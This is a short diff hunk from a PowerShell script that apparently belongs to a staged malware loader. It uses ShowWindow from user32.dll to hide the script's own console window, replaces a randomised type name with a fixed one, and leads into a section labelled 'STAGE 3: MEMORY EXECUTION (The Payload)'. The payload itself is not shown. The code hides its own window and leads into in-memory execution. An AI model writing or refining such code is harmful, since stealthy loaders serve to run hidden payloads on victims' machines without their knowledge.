@@ -40,7 +40,8 @@ $ms = @'
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 '@
-$type = Add-Type -MemberDefinition $ms -Name ("W32_" + (Get-Random)) -Namespace "Win32" -PassThru
+# $type = Add-Type -MemberDefinition $ms -Name ("W32_" + (Get-Random)) -Namespace "Win32" -PassThru
+$type = Add-Type -MemberDefinition $ms -Name "Win32" -Namespace "Win32" -PassThru
 $type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
 # --- STAGE 3: MEMORY EXECUTION (The Payload) ---
